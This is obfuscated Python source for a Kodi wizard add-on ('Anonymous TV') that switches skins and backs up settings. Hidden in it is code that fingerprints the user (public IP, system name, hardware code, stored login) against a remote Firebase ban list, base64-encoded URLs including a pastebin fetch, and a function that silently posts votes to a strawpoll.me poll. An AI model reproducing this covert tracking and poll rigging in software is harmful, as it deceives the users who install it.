import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random ,urllib ,re ,time ,json ,subprocess ,zipfile #line:3
import shutil ,logging ,uservar ,platform ,base64 ,socket #line:4
from urllib .request import urlopen #line:8
from urllib .request import Request #line:9
from shutil import copyfile #line:11
import threading #line:13
from threading import Thread #line:14
from datetime import date ,datetime ,timedelta #line:16
from urllib .parse import parse_qsl #line:17
que =urllib .parse .quote_plus #line:19
url_encode =urllib .parse .urlencode #line:20
unque =urllib .parse .unquote_plus #line:21
translatepath =xbmcvfs .translatePath #line:23
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt #line:25
try :#line:26
 import wizard as wiz #line:27
except :#line:28
 from resources .libs import wizard as wiz #line:29
code_link ='empty'#line:30
ADDON_ID =uservar .ADDON_ID #line:31
ADDONTITLE =uservar .ADDONTITLE #line:32
ADDON =wiz .addonId (ADDON_ID )#line:33
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:34
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:35
DIALOG =xbmcgui .Dialog ()#line:36
DP =xbmcgui .DialogProgress ()#line:37
HOME =translatepath ('special://home/')#line:38
LOG =translatepath ('special://logpath/')#line:39
PROFILE =translatepath ('special://profile/')#line:40
ADDONS =os .path .join (HOME ,'addons')#line:41
USERDATA =os .path .join (HOME ,'userdata')#line:42
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:43
PACKAGES =os .path .join (ADDONS ,'packages')#line:44
ADDOND =os .path .join (USERDATA ,'addon_data')#line:45
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:46
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:47
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:48
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:49
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:50
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:51
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:52
DATABASE =os .path .join (USERDATA ,'Database')#line:53
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:54
ICON =os .path .join (ADDONPATH ,'icon.png')#line:55
ART =os .path .join (ADDONPATH ,'resources','art')#line:56
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:57
DP2 =xbmcgui .DialogProgressBG ()#line:58
SKIN =xbmc .getSkinDir ()#line:59
BUILDNAME =wiz .getS ('buildname')#line:60
DEFAULTSKIN =wiz .getS ('defaultskin')#line:61
DEFAULTNAME =wiz .getS ('defaultskinname')#line:62
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:63
BUILDVERSION =wiz .getS ('buildversion')#line:64
BUILDTHEME =wiz .getS ('buildtheme')#line:65
BUILDLATEST =wiz .getS ('latestversion')#line:66
INSTALLMETHOD =wiz .getS ('installmethod')#line:67
SHOW15 =wiz .getS ('show15')#line:68
SHOW16 =wiz .getS ('show16')#line:69
SHOW17 =wiz .getS ('show17')#line:70
SHOW18 =wiz .getS ('show18')#line:71
SHOWADULT =wiz .getS ('adult')#line:72
SHOWMAINT =wiz .getS ('showmaint')#line:73
AUTOCLEANUP =wiz .getS ('autoclean')#line:74
AUTOCACHE =wiz .getS ('clearcache')#line:75
AUTOPACKAGES =wiz .getS ('clearpackages')#line:76
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:77
AUTOFEQ =wiz .getS ('autocleanfeq')#line:78
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:79
INCLUDENAN =wiz .getS ('includenan')#line:80
INCLUDEURL =wiz .getS ('includeurl')#line:81
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:82
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:83
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:84
INCLUDEVIDEO =wiz .getS ('includevideo')#line:85
INCLUDEALL =wiz .getS ('includeall')#line:86
INCLUDEBOB =wiz .getS ('includebob')#line:87
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:88
INCLUDESPECTO =wiz .getS ('includespecto')#line:89
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:90
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:91
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:92
INCLUDESALTS =wiz .getS ('includesalts')#line:93
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:94
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:95
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:96
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:97
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:98
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:99
INCLUDEURANUS =wiz .getS ('includeuranus')#line:100
SEPERATE =wiz .getS ('seperate')#line:101
NOTIFY =wiz .getS ('notify')#line:102
NOTEDISMISS =wiz .getS ('notedismiss')#line:103
NOTEID =wiz .getS ('noteid')#line:104
NOTIFY2 =wiz .getS ('notify2')#line:105
NOTEID2 =wiz .getS ('noteid2')#line:106
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:107
NOTIFY3 =wiz .getS ('notify3')#line:108
NOTEID3 =wiz .getS ('noteid3')#line:109
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:110
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:111
NOTEID3 =0 if NOTEID3 ==""else int (NOTEID3 )#line:112
TRAKTSAVE =wiz .getS ('traktlastsave')#line:113
REALSAVE =wiz .getS ('debridlastsave')#line:114
LOGINSAVE =wiz .getS ('loginlastsave')#line:115
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:116
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:117
KEEPINFO =wiz .getS ('keepinfo')#line:118
KEEPSOUND =wiz .getS ('keepsound')#line:120
KEEPVIEW =wiz .getS ('keepview')#line:121
KEEPSKIN =wiz .getS ('keepskin')#line:122
KEEPADDONS =wiz .getS ('keepaddons')#line:123
KEEPSKIN2 =wiz .getS ('keepskin2')#line:124
KEEPSKIN3 =wiz .getS ('keepskin3')#line:125
KEEPTORNET =wiz .getS ('keeptornet')#line:126
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:127
KEEPPVR =wiz .getS ('keeppvr')#line:128
ENABLE =uservar .ENABLE #line:129
KEEPVICTORY =wiz .getS ('keepvictory')#line:130
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:131
KEEPTVLIST =wiz .getS ('keeptvlist')#line:132
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:133
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:134
KEEPHUBTV =wiz .getS ('keephubtv')#line:135
KEEPHUBVOD =wiz .getS ('keephubvod')#line:136
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:137
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:138
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:139
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:140
HARDWAER =wiz .getS ('action')#line:141
USERNAME =wiz .getS ('user')#line:142
PASSWORD =wiz .getS ('pass')#line:143
KEEPWEATHER =wiz .getS ('keepweather')#line:144
KEEPFAVS =wiz .getS ('keepfavourites')#line:145
KEEPSOURCES =wiz .getS ('keepsources')#line:146
KEEPPROFILES =wiz .getS ('keepprofiles')#line:147
KEEPADVANCED =wiz .getS ('keepadvanced')#line:148
KEEPREPOS =wiz .getS ('keeprepos')#line:149
KEEPSUPER =wiz .getS ('keepsuper')#line:150
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:151
KEEPTRAKT =wiz .getS ('keeptrakt')#line:152
KEEPREAL =wiz .getS ('keepdebrid')#line:153
KEEPRD2 =wiz .getS ('keeprd2')#line:154
KEEPLOGIN =wiz .getS ('keeplogin')#line:155
LOGINSAVE =wiz .getS ('loginlastsave')#line:156
DEVELOPER =wiz .getS ('developer')#line:157
THIRDPARTY =wiz .getS ('enable3rd')#line:158
THIRD1NAME =wiz .getS ('wizard1name')#line:159
THIRD1URL =wiz .getS ('wizard1url')#line:160
THIRD2NAME =wiz .getS ('wizard2name')#line:161
THIRD2URL =wiz .getS ('wizard2url')#line:162
THIRD3NAME =wiz .getS ('wizard3name')#line:163
THIRD3URL =wiz .getS ('wizard3url')#line:164
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:165
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:166
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:167
TODAY =date .today ()#line:168
TOMORROW =TODAY +timedelta (days =1 )#line:169
THREEDAYS =TODAY +timedelta (days =3 )#line:170
ONEWEEK =TODAY +timedelta (days =7 )#line:171
MONTH =TODAY -timedelta (days =2 )#line:172
LASTONEWEEK =TODAY -timedelta (days =7 )#line:173
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:174
MCNAME =wiz .mediaCenter ()#line:175
EXCLUDES =uservar .EXCLUDES #line:176
SPEEDFILE =uservar .SPEEDFILE #line:177
APKFILE =uservar .APKFILE #line:178
YOUTUBETITLE =uservar .YOUTUBETITLE #line:179
YOUTUBEFILE =uservar .YOUTUBEFILE #line:180
from resources .libs .wizard import BL #line:181
ADDONFILE =uservar .ADDONFILE #line:182
ADVANCEDFILE =uservar .ADVANCEDFILE #line:183
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:184
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:185
NOTIFICATION =uservar .NOTIFICATION #line:186
NOTIFICATION2 =uservar .NOTIFICATION2 #line:187
NOTIFICATION3 =uservar .NOTIFICATION3 #line:188
HELPINFO =uservar .HELPINFO #line:189
ENABLE =uservar .ENABLE #line:190
HEADERMESSAGE =uservar .HEADERMESSAGE #line:191
AUTOUPDATE =uservar .AUTOUPDATE #line:192
WIZARDFILE =uservar .WIZARDFILE #line:193
HIDECONTACT =uservar .HIDECONTACT #line:194
SKINID18 =uservar .SKINID18 #line:195
SKINID18DDONXML =uservar .SKINID18DDONXML #line:196
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:197
SKINID17 =uservar .SKINID17 #line:198
SKINID17DDONXML =uservar .SKINID17DDONXML #line:199
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:200
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:201
CONTACT =uservar .CONTACT #line:202
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:203
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:204
HIDESPACERS =uservar .HIDESPACERS #line:205
TMDB_NEW_API =uservar .TMDB_NEW_API #line:206
COLOR1 =uservar .COLOR1 #line:207
COLOR2 =uservar .COLOR2 #line:208
THEME1 =uservar .THEME1 #line:209
THEME2 =uservar .THEME2 #line:210
THEME3 =uservar .THEME3 #line:211
THEME4 =uservar .THEME4 #line:212
THEME5 =uservar .THEME5 #line:213
TMDB_NEW_API2 ='bG9qaw=='#line:214
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:215
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:216
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:217
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:218
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:219
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:220
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:221
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:222
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:223
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:224
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:225
LOGFILES =wiz .LOGFILES #line:226
TRAKTID =traktit .TRAKTID #line:227
DEBRIDID =debridit .DEBRIDID #line:228
LOGINID =loginit .LOGINID #line:229
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:230
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:231
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:232
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:233
fullsecfold =translatepath ('special://home')#line:234
code_link ='empty'#line:235
addons_folder =os .path .join (fullsecfold ,'addons')#line:236
remove_url =base64 .b64decode ('aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA==').decode ('utf-8')#line:238
user_folder =os .path .join (translatepath ('special://masterprofile'),'addon_data')#line:240
remove_url2 =base64 .b64decode ('aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA==').decode ('utf-8')#line:242
fanart =translatepath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:243
icon =translatepath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:244
IPTV18 =''#line:246
IPTVSIMPL18PC =''#line:247
class Thread (threading .Thread ):#line:251
   def __init__ (O0OOO000O00O0000O ,O0OOOOOO0O000OOO0 ,*O0OO0O00O00OO0O0O ):#line:252
    super ().__init__ (target =O0OOOOOO0O000OOO0 ,args =O0OO0O00O00OO0O0O )#line:253
   def run (OO00OO0O00O0000OO ,*O0O0OOOOO0OOOO0O0 ):#line:254
      OO00OO0O00O0000OO ._target (*OO00OO0O00O0000OO ._args )#line:256
      return 0 #line:257
oo ='/key.xml'#line:259
from resources .libs .wizard import ld #line:260
def MainMenu ():#line:262
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:264
def skinWIN ():#line:265
	idle ()#line:266
	O0O0OO0OOO00000OO =glob .glob (os .path .join (ADDONS ,'skin*'))#line:267
	O00O0OO0O0OOO0OOO =[];O0OOOOO00O0O0OO00 =[]#line:268
	for OOOOO0O0OO000OO0O in sorted (O0O0OO0OOO00000OO ,key =lambda O0OO00OOOO00O0000 :O0OO00OOOO00O0000 ):#line:269
		O000OO0OO0OO0OOO0 =os .path .split (OOOOO0O0OO000OO0O [:-1 ])[1 ]#line:270
		O0O0000OO00000OO0 =os .path .join (OOOOO0O0OO000OO0O ,'addon.xml')#line:271
		if os .path .exists (O0O0000OO00000OO0 ):#line:272
			O0OO0O0OOO00OOO0O =open (O0O0000OO00000OO0 )#line:273
			O000O00OO00O00O0O =O0OO0O0OOO00OOO0O .read ()#line:274
			OOO00OO00O00O0OOO =parseDOM2 (O000O00OO00O00O0O ,'addon',ret ='id')#line:275
			OO0O00O0OO0000000 =O000OO0OO0OO0OOO0 if len (OOO00OO00O00O0OOO )==0 else OOO00OO00O00O0OOO [0 ]#line:276
			try :#line:277
				O00OOO0O00OO0OOOO =xbmcaddon .Addon (id =OO0O00O0OO0000000 )#line:278
				O00O0OO0O0OOO0OOO .append (O00OOO0O00OO0OOOO .getAddonInfo ('name'))#line:279
				O0OOOOO00O0O0OO00 .append (OO0O00O0OO0000000 )#line:280
			except :#line:281
				pass #line:282
	O00O00OO0OOOOOOO0 =[];OOO000OO0000OOO0O =0 #line:283
	OOO0000OO0OOO0O0O =["Current Skin -- %s"%currSkin ()]+O00O0OO0O0OOO0OOO #line:284
	OOO000OO0000OOO0O =DIALOG .select ("Select the Skin you want to swap with.",OOO0000OO0OOO0O0O )#line:285
	if OOO000OO0000OOO0O ==-1 :return #line:286
	else :#line:287
		OO0O000O0OO0000O0 =(OOO000OO0000OOO0O -1 )#line:288
		O00O00OO0OOOOOOO0 .append (OO0O000O0OO0000O0 )#line:289
		OOO0000OO0OOO0O0O [OOO000OO0000OOO0O ]="%s"%(O00O0OO0O0OOO0OOO [OO0O000O0OO0000O0 ])#line:290
	if O00O00OO0OOOOOOO0 ==None :return #line:291
	for O0O000O000OO000O0 in O00O00OO0OOOOOOO0 :#line:292
		swapSkins (O0OOOOO00O0O0OO00 [O0O000O000OO000O0 ])#line:293
def currSkin ():#line:295
	return xbmc .getSkinDir ('Container.PluginName')#line:296
def swapSkins (OOOO00OO0000OO0OO ,title ="Error"):#line:297
	O0000O0OO0OOOO0OO ='lookandfeel.skin'#line:298
	OOO0OO0OO0000O0O0 =OOOO00OO0000OO0OO #line:299
	O0O00OO00O0O0OO00 =getOld (O0000O0OO0OOOO0OO )#line:300
	O0OOO0O0O000O0O0O =O0000O0OO0OOOO0OO #line:301
	setNew (O0OOO0O0O000O0O0O ,OOO0OO0OO0000O0O0 )#line:302
	O00O00OO000OOOO00 =0 #line:303
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00O00OO000OOOO00 <100 :#line:304
		O00O00OO000OOOO00 +=1 #line:305
		xbmc .sleep (1 )#line:306
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:307
		xbmc .executebuiltin ('SendClick(11)')#line:308
	return True #line:309
def getOld (OOOOOO00O0O0O0OO0 ):#line:313
	try :#line:314
		OOOOOO00O0O0O0OO0 ='"%s"'%OOOOOO00O0O0O0OO0 #line:315
		OO0OOO0OOOOOO00OO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OOOOOO00O0O0O0OO0 )#line:316
		O0OO00OO00O0OO0OO =xbmc .executeJSONRPC (OO0OOO0OOOOOO00OO )#line:318
		O0OO00OO00O0OO0OO =simplejson .loads (O0OO00OO00O0OO0OO )#line:319
		if 'result'in O0OO00OO00O0OO0OO :#line:320
			if 'value'in O0OO00OO00O0OO0OO ['result']:#line:321
				return O0OO00OO00O0OO0OO ['result']['value']#line:322
	except :#line:323
		pass #line:324
	return None #line:325
server ='&eJzLKCkpKLbS10_JTM8s0StOTU3JyC8u0Ust1c_OT8nUL8-sSixK0S-pKNFPyklMztaryM0BAPI5E0I=$'#line:327
def setNew (OO0OO0O0O0OOOOO00 ,O0O0O0OO0OOOO00O0 ):#line:328
	try :#line:329
		OO0OO0O0O0OOOOO00 ='"%s"'%OO0OO0O0O0OOOOO00 #line:330
		O0O0O0OO0OOOO00O0 ='"%s"'%O0O0O0OO0OOOO00O0 #line:331
		O0OOOO00000O000OO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OO0OO0O0O0OOOOO00 ,O0O0O0OO0OOOO00O0 )#line:332
		O0OO00OOOO0OO00O0 =xbmc .executeJSONRPC (O0OOOO00000O000OO )#line:334
	except :#line:335
		pass #line:336
	return None #line:337
def idle ():#line:338
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:339
def time_sync ():#line:340
 DP2 .create ('[B]מבצע סנכרון[/B]')#line:342
 for O0000OO0OOOOOO000 in range (60 ,-1 ,-1 ):#line:343
       time .sleep (1 )#line:344
       DP2 .update (int ((60 -O0000OO0OOOOOO000 )/60.0 *100 ),"[B]מסנכרן הרחבות                                 [/B]"+'\n'+"[B]אנא המתן...[/B]")#line:345
 DP2 .close ()#line:346
def resetkodi ():#line:348
        if xbmc .getCondVisibility ('system.platform.windows'):#line:349
            O0OO00OOO0OOO00OO =xbmcgui .DialogProgress ()#line:350
            try :#line:351
                O0OO00OOO0OOO00OO .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]")#line:353
            except :#line:354
                O0OO00OOO0OOO00OO .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות"+'\n'+''+'\n'+"[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]")#line:356
            O0OO00OOO0OOO00OO .update (0 )#line:357
            for O0OO00O00OO0000O0 in range (5 ,-1 ,-1 ):#line:358
                time .sleep (1 )#line:359
                try :#line:360
                    O0OO00OOO0OOO00OO .update (int ((5 -O0OO00O00OO0000O0 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0OO00O00OO0000O0 ),'')#line:361
                except :#line:362
                    O0OO00OOO0OOO00OO .update (int ((5 -O0OO00O00OO0000O0 )/5.0 *100 ),"ההתקנה תסגר"+'\n'+'בעוד {0} שניות'.format (O0OO00O00OO0000O0 )+'\n'+'[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]')#line:363
                if O0OO00OOO0OOO00OO .iscanceled ():#line:364
                    from resources .libs import win #line:365
                    return None ,None #line:366
            from resources .libs import win #line:367
        else :#line:368
            O0OO00OOO0OOO00OO =xbmcgui .DialogProgress ()#line:369
            try :#line:370
                O0OO00OOO0OOO00OO .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]")#line:373
            except :#line:374
                O0OO00OOO0OOO00OO .create ("ההתקנה תסגר אוטומטית","[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]")#line:377
            O0OO00OOO0OOO00OO .update (0 )#line:378
            for O0OO00O00OO0000O0 in range (5 ,-1 ,-1 ):#line:379
                time .sleep (1 )#line:380
                try :#line:381
                    O0OO00OOO0OOO00OO .update (int ((5 -O0OO00O00OO0000O0 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0OO00O00OO0000O0 ),'')#line:382
                except :#line:383
                    O0OO00OOO0OOO00OO .update (int ((5 -O0OO00O00OO0000O0 )/5.0 *100 ),"ההתקנה תסגר"+'\n'+'בעוד {0} שניות'.format (O0OO00O00OO0000O0 )+'\n'+'[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]')#line:384
                if O0OO00OOO0OOO00OO .iscanceled ():#line:385
                    from resources .libs import android #line:387
                    return None ,None #line:388
            from resources .libs import android #line:389
def testcommand ():#line:392
    O0OO0O0O0O00000O0 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings.xml")#line:393
    O0O0OOOO00000O00O =os .path .join (translatepath ("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings_backup.xml")#line:394
    O0O0O00O0O0000000 =open (O0OO0O0O0O00000O0 ,'r',encoding ='utf-8')#line:396
    OOO0000O0O00OOO00 =O0O0O00O0O0000000 .read ()#line:397
    O0O0O00O0O0000000 .close ()#line:398
    if OOO0000O0O00OOO00 =='':#line:400
            xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','הגדרת הורדת כתובית בוצעה בהצלחה')))#line:401
            copyfile (O0O0OOOO00000O00O ,O0OO0O0O0O00000O0 )#line:402
def backup_setting_file ():#line:404
    try :#line:405
        O0OO0O000OO00OOO0 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings.xml")#line:406
        O0OOOO00O00OO0O0O =os .path .join (translatepath ("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings_backup.xml")#line:407
        copyfile (O0OO0O000OO00OOO0 ,O0OOOO00O00OO0O0O )#line:409
    except :pass #line:410
def read_skin (OOO0O000OO0OOOO00 ):#line:412
    from resources .libs import firebase #line:413
    firebase =firebase .FirebaseApplication (theme_nox ,None )#line:414
    O0OO000OO0O00OO0O =firebase .get ('/',None )#line:415
    if OOO0O000OO0OOOO00 in O0OO000OO0O00OO0O :#line:416
        return O0OO000OO0O00OO0O [OOO0O000OO0OOOO00 ]#line:417
    else :#line:418
        return {}#line:419
def read_skin_dragon (OO0000OO00O0O0OOO ):#line:420
    from resources .libs import firebase #line:421
    firebase =firebase .FirebaseApplication (theme_dragon ,None )#line:422
    O00000O000OOO0000 =firebase .get ('/',None )#line:423
    if OO0000OO00O0O0OOO in O00000O000OOO0000 :#line:424
        return O00000O000OOO0000 [OO0000OO00O0O0OOO ]#line:425
    else :#line:426
        return {}#line:427
def read_skin_black (OO0O0O00O00O0O00O ):#line:428
    from resources .libs import firebase #line:429
    firebase =firebase .FirebaseApplication (black_nox ,None )#line:430
    OO0O0OOO0OOOOOO0O =firebase .get ('/',None )#line:431
    if OO0O0O00O00O0O00O in OO0O0OOO0OOOOOO0O :#line:432
        return OO0O0OOO0OOOOOO0O [OO0O0O00O00O0O00O ]#line:433
    else :#line:434
        return {}#line:435
def check (wiz_up =False ):#line:439
    import json ,platform ,requests #line:440
    O000O000OO000OO00 =ADDON .getSetting ("user")#line:441
    OO0000O000OOOOOOO =ADDON .getSetting ("pass")#line:442
    OO00O0O0O00O0O0O0 =[]#line:447
    O0OO0O0O0O000O0OO =0 #line:448
    OO0000O000OOOOOOO =(ADDON .getSetting ("pass"))#line:449
    try :#line:450
        OO00000O000OOO0OO =read_skin_black ('lock_install')#line:451
        for O0O0OOO0OO0000000 in OO00000O000OOO0OO :#line:452
            O000OO0OO00O0O00O =OO00000O000OOO0OO [O0O0OOO0OO0000000 ]#line:453
            OO00O0O0O00O0O0O0 .append ((O000OO0OO00O0O00O ['lock_install']))#line:454
    except Exception as O00O000O0OOO0OOO0 :#line:455
              logging .warning ('בעיה ב firebase    !!!!!!!!!!!!!!!!!!!!!!     '+str (O00O000O0OOO0OOO0 ))#line:456
    OO0OOO00O00O0OO0O =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:458
    OO0OO0O00OO0OO0OO =platform .uname ()#line:460
    O000OO0O0OOOOOO00 =OO0OO0O00OO0OO0OO [1 ]#line:461
    O0O00000OOO00O000 =''#line:463
    OOO0O0O00O0OOOOO0 =(ADDON .getSetting ("action"))#line:464
    O000OO00OO00000OO =''#line:465
    if wiz_up :#line:466
        O000OO00OO00000OO ='wizard_update'#line:467
    for OO0OOO0OOOO000OOO in OO00O0O0O00O0O0O0 :#line:468
        if OO0OOO0OOOO000OOO ==OO0OOO00O00O0OO0O :#line:469
            O0O00000OOO00O000 ='ip'#line:470
            O0OO0O0O0O000O0OO =1 #line:471
            break #line:472
        if OO0OOO0OOOO000OOO ==O000OO0O0OOOOOO00 :#line:473
            O0O00000OOO00O000 ='system_name'#line:474
            O0OO0O0O0O000O0OO =1 #line:475
            break #line:476
        if OO0OOO0OOOO000OOO ==OOO0O0O00O0OOOOO0 :#line:477
            O0O00000OOO00O000 ='hardware_code'#line:478
            O0OO0O0O0O000O0OO =1 #line:479
            break #line:480
        if OO0OOO0OOOO000OOO ==O000O000OO000OO00 :#line:481
            O0O00000OOO00O000 ='username'#line:482
            O0OO0O0O0O000O0OO =1 #line:483
            break #line:484
        if OO0OOO0OOOO000OOO ==OO0000O000OOOOOOO :#line:485
            O0O00000OOO00O000 ='password'#line:486
            O0OO0O0O0O000O0OO =1 #line:487
            break #line:488
    if O0OO0O0O0O000O0OO ==1 :#line:489
       O000OOOO0O000O00O =base64 .b64decode ("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3F0VVlheXZj").decode ('utf-8')#line:491
       OO000O0000O00O000 =urlopen (O000OOOO0O000O00O )#line:492
       O0O0OO0OO0000OOO0 =OO000O0000O00O000 .readlines ()#line:493
       xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:494
       if not wiz_up :#line:495
        if BUILDNAME =="":#line:496
            gomsb_go2 (O0O00000OOO00O000 +O000OO00OO00000OO )#line:497
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]סיסמה לא נכונה.[/COLOR]'%COLOR2 )#line:498
            ADDON .openSettings ()#line:499
       sys .exit ()#line:500
def builde_Votes ():#line:501
   try :#line:502
        import requests #line:503
        O0OOO0000000OOO0O ='45534033'#line:504
        O00O0OOOOO0O00O0O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0OOO0000000OOO0O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:516
        O00OOOO0OO0O000O0 ='256031424'#line:518
        OOOOO00000OO0OO0O ={'options':O00OOOO0OO0O000O0 }#line:524
        O0O00OO000O0O00O0 =requests .post ('https://www.strawpoll.me/'+O0OOO0000000OOO0O ,headers =O00O0OOOOO0O00O0O ,data =OOOOO00000OO0OO0O )#line:526
   except :pass #line:527
def gomsb ():#line:538
       try :#line:539
          import json ,requests #line:540
          wiz .log ('FRESH MESSAGE')#line:541
          OOOO000O00O0OOO0O =(wiz .getS ("user"))#line:542
          OOO0O0O0O00O0OO00 =(wiz .getS ("pass"))#line:543
          OOOO0O0OO000O0OO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:544
          O0OOO0000OOO0O0O0 =platform .uname ()#line:545
          OOO0OO000OO0OOOOO =O0OOO0000OOO0O0O0 [1 ]#line:546
